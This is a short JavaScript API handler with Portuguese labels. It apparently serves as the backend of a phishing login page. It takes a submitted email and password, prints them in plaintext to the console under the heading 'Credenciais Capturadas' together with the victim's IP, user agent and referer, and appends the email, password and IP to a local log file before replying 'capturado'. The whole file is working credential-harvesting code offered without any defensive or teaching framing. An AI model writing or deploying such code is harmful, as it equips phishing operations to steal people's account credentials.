export default async function handler(req, res) {
  if (req.method !== 'POST') {
    return res.status(405).json({ message: 'Method not allowed' });
  }

  const { email, senha } = req.body;

  // Captura de informações do request
  const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
  const userAgent = req.headers['user-agent'];
  const referer = req.headers['referer'];
  const timestamp = new Date().toISOString();

  // Log completo
  console.log('----------------------------------');
  console.log('📥 Credenciais Capturadas');
  console.log(`📧 Email: ${email}`);
  console.log(`🔑 Senha: ${senha}`);
  console.log(`🌐 IP: ${ip}`);
  console.log(`📱 User-Agent: ${userAgent}`);
  console.log(`🔗 Referer: ${referer}`);
  console.log(`🕒 Timestamp: ${timestamp}`);
  console.log('----------------------------------');

  // Armazena em arquivo de log
  try {
    const fs = require('fs');
    fs.appendFileSync('logs.txt', 
      `[${timestamp}] Email: ${email}, Senha: ${senha}, IP: ${ip}\n`);
  } catch (err) {
    console.error('Erro ao salvar log:', err);
  }

  return res.status(200).json({ status: 'capturado' });
}
